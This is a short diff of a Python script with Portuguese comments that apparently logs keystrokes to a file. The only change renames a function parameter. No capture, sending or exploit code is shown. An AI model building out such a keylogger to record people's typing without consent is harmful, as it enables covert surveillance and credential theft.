@@ -4,7 +4,7 @@ import random
 import sys
 #gerando nome do arquivo de log
 
-def encerra_programa(ke):
+def encerra_programa(key):
     print('Programa encerrado')
 # função que escreve as teclas no arquivo de log
 def escreve_key(key):
